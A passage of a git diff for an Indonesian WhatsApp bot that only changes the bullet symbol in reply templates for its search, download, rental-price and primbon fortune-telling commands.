@@ -692,11 +692,11 @@ Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
             break
 	    case 'donasi': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
 	    if (!isCreator) return
-                jobotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/74fd634010128be37972c.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n│➳ 13k Per Group via E-Walet 1 Month\n│➳ 18k via pulsa 1 Month\n\n Premium Price Bot\n│➳ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6281364111257 (Owner)\n\nDonate For Me : \n\n│➳ Paypal : https://www.paypal.me/Cakhaho\n│➳ Saweria : https://saweria.co/DikaArdnt` }, { quoted: m })
+                jobotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/74fd634010128be37972c.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n│➣ 13k Per Group via E-Walet 1 Month\n│➣ 18k via pulsa 1 Month\n\n Premium Price Bot\n│➣ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6281364111257 (Owner)\n\nDonate For Me : \n\n│➣ Paypal : https://www.paypal.me/Cakhaho\n│➣ Saweria : https://saweria.co/DikaArdnt` }, { quoted: m })
             }
             break
 case 'sc': case 'script': {
-m.reply(`╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮\n┃╭┈─────────────⩵꙰ཱི࿐\n┃╰── ⏤͟͟͞Script Bot ──➤ ↶↷\n╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣\n ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬\n╭━━•›\n│➳ Subscribe Channel\n│➳ IKYY MAKERZ\n│➳ https://youtube.com/channel/UCQmja37q_Pap24MgG0vUITQ\n╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐\n ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬`)
+m.reply(`╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮\n┃╭┈─────────────⩵꙰ཱི࿐\n┃╰── ⏤͟͟͞Script Bot ──➤ ↶↷\n╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣\n ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬\n╭━━•›\n│➣ Subscribe Channel\n│➣ IKYY MAKERZ\n│➣ https://youtube.com/channel/UCQmja37q_Pap24MgG0vUITQ\n╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐\n ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬`)
             }
             break
 
@@ -967,7 +967,7 @@ break
                if (!text) throw `Example : ${prefix + command} packname|author`
           global.packname = text.split("|")[0]
           global.author = text.split("|")[1]
-          m.reply(`Exif berhasil diubah menjadi\n\n│➳ Packname : ${global.packname}\n│➳ Author : ${global.author}`)
+          m.reply(`Exif berhasil diubah menjadi\n\n│➣ Packname : ${global.packname}\n│➣ Author : ${global.author}`)
             }
             break
 	case 'kick': {
@@ -1065,7 +1065,7 @@ break
 let teks = `══✪〘 👥 Tag All 〙✪══
 •━══〘тнєιкувσтz〙══━• \nINFO: ${q ? q : 'kosong'}\n•━══〘тнєιкувσтz〙══━• \n`
                 for (let mem of participants) {
-                teks += `╭━═════════════━• \n│➳ @${mem.id.split('@')[0]}\n╰━═════════════━•\n•━══〘Iιкувσтz〙══━• `
+                teks += `╭━═════════════━• \n│➣ @${mem.id.split('@')[0]}\n╰━═════════════━•\n•━══〘Iιкувσтz〙══━• `
                 }
                 jobotz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                 }
@@ -1084,7 +1084,7 @@ let teks = `══✪〘 👥 Tag All 〙✪══
                 let anu = await styletext(text)
                 let teks = `Srtle Text From ${text}\n\n`
                 for (let i of anu) {
-                    teks += `│➳ *${i.name}* : ${i.result}\n\n`
+                    teks += `│➣ *${i.name}* : ${i.result}\n\n`
                 }
                 m.reply(teks)
 	    }
@@ -1478,8 +1478,8 @@ break
                     let read = i.readTimestamp
                     let unread = i.receiptTimestamp
                     let waktu = read ? read : unread
-                    teks += `│➳ @${i.userJid.split('@')[0]}\n`
-                    teks += ` ┗━│➳ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} │➳ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
+                    teks += `│➣ @${i.userJid.split('@')[0]}\n`
+                    teks += ` ┗━│➣ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} │➣ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                 }
                 jobotz.sendTextWithMentions(m.chat, teks, m)
             }
@@ -1514,7 +1514,7 @@ break
              case 'listonline': case 'liston': {
                     let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                     let online = [...Object.keys(store.presences[id]), botNumber]
-                    jobotz.sendText(m.chat, 'List Online:\n\n' + online.map(v => '│➳ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
+                    jobotz.sendText(m.chat, 'List Online:\n\n' + online.map(v => '│➣ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
              }
              break
             case 'sticker': case 's': case 'stickergif': case 'sgif': {
@@ -1734,7 +1734,7 @@ break
                 let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                 let no = 1
                 for (let i of search.all) {
-                    teks += `│➳ No : ${no++}\n│➳ Type : ${i.type}\n│➳ Video ID : ${i.videoId}\n│➳ Title : ${i.title}\n│➳ Views : ${i.views}\n│➳ Duration : ${i.timestamp}\n│➳ Upload At : ${i.ago}\n│➳ Author : ${i.author.name}\n│➳ Url : ${i.url}\n\n─────────────────\n\n`
+                    teks += `│➣ No : ${no++}\n│➣ Type : ${i.type}\n│➣ Video ID : ${i.videoId}\n│➣ Title : ${i.title}\n│➣ Views : ${i.views}\n│➣ Duration : ${i.timestamp}\n│➣ Upload At : ${i.ago}\n│➣ Author : ${i.author.name}\n│➣ Url : ${i.url}\n\n─────────────────\n\n`
                 }
                 jobotz.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
             }
@@ -1746,9 +1746,9 @@ break
                 google({'query': text}).then(res => {
                 let teks = `Google Search From : ${text}\n\n`
                 for (let g of res) {
-                teks += `│➳ *Title* : ${g.title}\n`
-                teks += `│➳ *Description* : ${g.snippet}\n`
-                teks += `│➳ *Link* : ${g.link}\n\n────────────────────────\n\n`
+                teks += `│➣ *Title* : ${g.title}\n`
+                teks += `│➣ *Description* : ${g.snippet}\n`
+                teks += `│➣ *Link* : ${g.link}\n\n────────────────────────\n\n`
                 } 
                 m.reply(teks)
                 })
@@ -1791,16 +1791,16 @@ break
                     image: { url: anu.thumbnail },
                     caption: `
 ╭━═════════════━•
-│➳ Title : ${anu.title}
-│➳ Ext : Search
-│➳ ID : ${anu.videoId}
-│➳ Duration : ${anu.timestamp}
-│➳ Viewers : ${anu.views}
-│➳ Upload At : ${anu.ago}
-│➳ Author : ${anu.author.name}
-│➳ Channel : ${anu.author.url}
-│➳ Description : ${anu.description}
-│➳ Url : ${anu.url}
+│➣ Title : ${anu.title}
+│➣ Ext : Search
+│➣ ID : ${anu.videoId}
+│➣ Duration : ${anu.timestamp}
+│➣ Viewers : ${anu.views}
+│➣ Upload At : ${anu.ago}
+│➣ Author : ${anu.author.name}
+│➣ Channel : ${anu.author.url}
+│➣ Description : ${anu.description}
+│➣ Url : ${anu.url}
 ╰━═════════════━•`,
                     footer: jobotz.user.name,
                     buttons: buttons,
@@ -1816,7 +1816,7 @@ break
                 let quality = args[1] ? args[1] : '128kbps'
                 let media = await yta(text, quality)
                 if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
-                jobotz.sendImage(m.chat, media.thumb, `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${isUrl(text)}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '128kbps'}`, m)
+                jobotz.sendImage(m.chat, media.thumb, `│➣ Title : ${media.title}\n│➣ File Size : ${media.filesizeF}\n│➣ Url : ${isUrl(text)}\n│➣ Ext : MP3\n│➣ Resolusi : ${args[1] || '128kbps'}`, m)
                 jobotz.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
             }
             break
@@ -1827,7 +1827,7 @@ break
                 let quality = args[1] ? args[1] : '360p'
                 let media = await ytv(text, quality)
                 if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
-                jobotz.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${isUrl(text)}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
+                jobotz.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `│➣ Title : ${media.title}\n│➣ File Size : ${media.filesizeF}\n│➣ Url : ${isUrl(text)}\n│➣ Ext : MP3\n│➣ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
             }
             break
 	    case 'getmusic': {
@@ -1841,7 +1841,7 @@ break
                 let quality = args[1] ? args[1] : '128kbps'
                 let media = await yta(urls[text - 1], quality)
                 if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
-                jobotz.sendImage(m.chat, media.thumb, `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${urls[text - 1]}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '128kbps'}`, m)
+                jobotz.sendImage(m.chat, media.thumb, `│➣ Title : ${media.title}\n│➣ File Size : ${media.filesizeF}\n│➣ Url : ${urls[text - 1]}\n│➣ Ext : MP3\n│➣ Resolusi : ${args[1] || '128kbps'}`, m)
                 jobotz.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
             }
             break
@@ -1856,7 +1856,7 @@ break
                 let quality = args[1] ? args[1] : '360p'
                 let media = await ytv(urls[text - 1], quality)
                 if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
-                jobotz.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${urls[text - 1]}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
+                jobotz.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `│➣ Title : ${media.title}\n│➣ File Size : ${media.filesizeF}\n│➣ Url : ${urls[text - 1]}\n│➣ Ext : MP3\n│➣ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
             }
             break
             case 'pinterest': {
@@ -1865,7 +1865,7 @@ break
 		let { pinterest } = require('./lib/scraper')
                 anu = await pinterest(text)
                 result = anu[Math.floor(Math.random() * anu.length)]
-                jobotz.sendMessage(m.chat, { image: { url: result }, caption: '│➳ Media Url : '+result }, { quoted: m })
+                jobotz.sendMessage(m.chat, { image: { url: result }, caption: '│➣ Media Url : '+result }, { quoted: m })
             }
             break
             case 'anime': case 'waifu': case 'husbu': case 'neko': case 'shinobu': case 'megumin': case 'waifus': case 'nekos': case 'trap': case 'blowjob': {
@@ -1909,7 +1909,7 @@ break
                 ]
                 let buttonMessage = {
                     image: { url: result.image[0] },
-                    caption: `│➳ Title : ${result.title}\n│➳ Category : ${result.type}\n│➳ Detail : ${result.source}\n│➳ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
+                    caption: `│➣ Title : ${result.title}\n│➣ Category : ${result.type}\n│➣ Detail : ${result.source}\n│➣ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                     footer: jobotz.user.name,
                     buttons: buttons,
                     headerType: 4
@@ -1928,7 +1928,7 @@ break
                 ]
                 let buttonMessage = {
                     image: { url: result.image },
-                    caption: `│➳ Title : ${result.title}\n│➳ Source : ${result.source}\n│➳ Media Url : ${result.image}`,
+                    caption: `│➣ Title : ${result.title}\n│➣ Source : ${result.source}\n│➣ Media Url : ${result.image}`,
                     footer: jobotz.user.name,
                     buttons: buttons,
                     headerType: 4
@@ -1994,7 +1994,7 @@ break
                 if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
                 let anu = await primbon.nomer_hoki(Number(text))
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Nomor HP :* ${anu.message.nomer_hp}\n│➳ *Angka Shuzi :* ${anu.message.angka_shuzi}\n│➳ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n│➳ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
+                jobotz.sendText(m.chat, `│➣ *Nomor HP :* ${anu.message.nomer_hp}\n│➣ *Angka Shuzi :* ${anu.message.angka_shuzi}\n│➣ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n│➣ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
             }
             break
             case 'artimimpi': case 'tafsirmimpi': {
@@ -2002,7 +2002,7 @@ break
                 if (!text) throw `Example : ${prefix + command} belanja`
                 let anu = await primbon.tafsir_mimpi(text)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Mimpi :* ${anu.message.mimpi}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Solusi :* ${anu.message.solusi}`, m)
+                jobotz.sendText(m.chat, `│➣ *Mimpi :* ${anu.message.mimpi}\n│➣ *Arti :* ${anu.message.arti}\n│➣ *Solusi :* ${anu.message.solusi}`, m)
             }
             break
             case 'ramalanjodoh': case 'ramaljodoh': {
@@ -2011,7 +2011,7 @@ break
                 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➣ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➣ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➣ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➣ *Hasil :* ${anu.message.result}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'ramalanjodohbali': case 'ramaljodohbali': {
@@ -2020,7 +2020,7 @@ break
                 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                 let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➣ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➣ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➣ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➣ *Hasil :* ${anu.message.result}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'suamiistri': {
@@ -2029,7 +2029,7 @@ break
                 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                 let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Nama Suami :* ${anu.message.suami.nama}\n│➳ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n│➳ *Nama Istri :* ${anu.message.istri.nama}\n│➳ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Nama Suami :* ${anu.message.suami.nama}\n│➣ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n│➣ *Nama Istri :* ${anu.message.istri.nama}\n│➣ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n│➣ *Hasil :* ${anu.message.result}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'ramalancinta': case 'ramalcinta': {
@@ -2038,7 +2038,7 @@ break
                 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                 let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➳ *Sisi Positif :* ${anu.message.sisi_positif}\n│➳ *Sisi Negatif :* ${anu.message.sisi_negatif}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➣ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➣ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➣ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➣ *Sisi Positif :* ${anu.message.sisi_positif}\n│➣ *Sisi Negatif :* ${anu.message.sisi_negatif}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'artinama': {
@@ -2046,7 +2046,7 @@ break
                 if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                 let anu = await primbon.arti_nama(text)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Nama :* ${anu.message.nama}\n│➣ *Arti :* ${anu.message.arti}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'kecocokannama': case 'cocoknama': {
@@ -2055,7 +2055,7 @@ break
                 let [nama, tgl, bln, thn] = text.split`,`
                 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Life Path :* ${anu.message.life_path}\n│➳ *Destiny :* ${anu.message.destiny}\n│➳ *Destiny Desire :* ${anu.message.destiny_desire}\n│➳ *Personality :* ${anu.message.personality}\n│➳ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Nama :* ${anu.message.nama}\n│➣ *Lahir :* ${anu.message.tgl_lahir}\n│➣ *Life Path :* ${anu.message.life_path}\n│➣ *Destiny :* ${anu.message.destiny}\n│➣ *Destiny Desire :* ${anu.message.destiny_desire}\n│➣ *Personality :* ${anu.message.personality}\n│➣ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
             }
             break
             case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
@@ -2064,7 +2064,7 @@ break
                 let [nama1, nama2] = text.split`|`
                 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendImage(m.chat,  anu.message.gambar, `│➳ *Nama Anda :* ${anu.message.nama_anda}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan}\n│➳ *Sisi Positif :* ${anu.message.sisi_positif}\n│➳ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
+                jobotz.sendImage(m.chat,  anu.message.gambar, `│➣ *Nama Anda :* ${anu.message.nama_anda}\n│➣ *Nama Pasangan :* ${anu.message.nama_pasangan}\n│➣ *Sisi Positif :* ${anu.message.sisi_positif}\n│➣ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
             }
             break
             case 'jadianpernikahan': case 'jadiannikah': {
@@ -2073,7 +2073,7 @@ break
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Tanggal Pernikahan :* ${anu.message.tanggal}\n│➳ *karakteristik :* ${anu.message.karakteristik}`, m)
+                jobotz.sendText(m.chat, `│➣ *Tanggal Pernikahan :* ${anu.message.tanggal}\n│➣ *karakteristik :* ${anu.message.karakteristik}`, m)
             }
             break
             case 'sifatusaha': {
@@ -2082,7 +2082,7 @@ break
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.hari_lahir}\n│➳ *Usaha :* ${anu.message.usaha}`, m)
+                jobotz.sendText(m.chat, `│➣ *Lahir :* ${anu.message.hari_lahir}\n│➣ *Usaha :* ${anu.message.usaha}`, m)
             }
             break
             case 'rejeki': case 'rezeki': {
@@ -2091,7 +2091,7 @@ break
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.hari_lahir}\n│➳ *Rezeki :* ${anu.message.rejeki}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Lahir :* ${anu.message.hari_lahir}\n│➣ *Rezeki :* ${anu.message.rejeki}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'pekerjaan': case 'kerja': {
@@ -2100,7 +2100,7 @@ break
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.hari_lahir}\n│➳ *Pekerjaan :* ${anu.message.pekerjaan}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Lahir :* ${anu.message.hari_lahir}\n│➣ *Pekerjaan :* ${anu.message.pekerjaan}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'ramalannasib': case 'ramalnasib': case 'nasib': {
@@ -2109,7 +2109,7 @@ break
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Analisa :* ${anu.message.analisa}\n│➳ *Angka Akar :* ${anu.message.angka_akar}\n│➳ *Sifat :* ${anu.message.sifat}\n│➳ *Elemen :* ${anu.message.elemen}\n│➳ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Analisa :* ${anu.message.analisa}\n│➣ *Angka Akar :* ${anu.message.angka_akar}\n│➣ *Sifat :* ${anu.message.sifat}\n│➣ *Elemen :* ${anu.message.elemen}\n│➣ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
             }
             break
             case 'potensipenyakit': case 'penyakit': {
@@ -2118,7 +2118,7 @@ break
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Analisa :* ${anu.message.analisa}\n│➳ *Sektor :* ${anu.message.sektor}\n│➳ *Elemen :* ${anu.message.elemen}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Analisa :* ${anu.message.analisa}\n│➣ *Sektor :* ${anu.message.sektor}\n│➣ *Elemen :* ${anu.message.elemen}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'artitarot': case 'tarot': {
@@ -2127,7 +2127,7 @@ break
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendImage(m.chat, anu.message.image, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Simbol Tarot :* ${anu.message.simbol_tarot}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendImage(m.chat, anu.message.image, `│➣ *Lahir :* ${anu.message.tgl_lahir}\n│➣ *Simbol Tarot :* ${anu.message.simbol_tarot}\n│➣ *Arti :* ${anu.message.arti}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'fengshui': {
@@ -2136,7 +2136,7 @@ break
                 let [nama, gender, tahun] = text.split`,`
                 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tahun_lahir}\n│➳ *Gender :* ${anu.message.jenis_kelamin}\n│➳ *Angka Kua :* ${anu.message.angka_kua}\n│➳ *Kelompok :* ${anu.message.kelompok}\n│➳ *Karakter :* ${anu.message.karakter}\n│➳ *Sektor Baik :* ${anu.message.sektor_baik}\n│➳ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
+                jobotz.sendText(m.chat, `│➣ *Nama :* ${anu.message.nama}\n│➣ *Lahir :* ${anu.message.tahun_lahir}\n│➣ *Gender :* ${anu.message.jenis_kelamin}\n│➣ *Angka Kua :* ${anu.message.angka_kua}\n│➣ *Kelompok :* ${anu.message.kelompok}\n│➣ *Karakter :* ${anu.message.karakter}\n│➣ *Sektor Baik :* ${anu.message.sektor_baik}\n│➣ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
             }
             break
             case 'haribaik': {
@@ -2145,7 +2145,7 @@ break
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
-                jobotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Kala Tinantang :* ${anu.message.kala_tinantang}\n│➳ *Info :* ${anu.message.info}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
+                jobotz.sendText(m.chat, `│➣ *Lahir :* ${anu.message.tgl_lahir}\n│➣ *Kala Tinantang :* ${anu.message.kala_tinantang}\n│➣ *Info :* ${anu.message.info}\n│➣ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'harisangar': case 'taliwangke': {
@@ -2154,7 +2154,7 @@ break
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                 if (anu.status == false) return m.reply(anu.message)
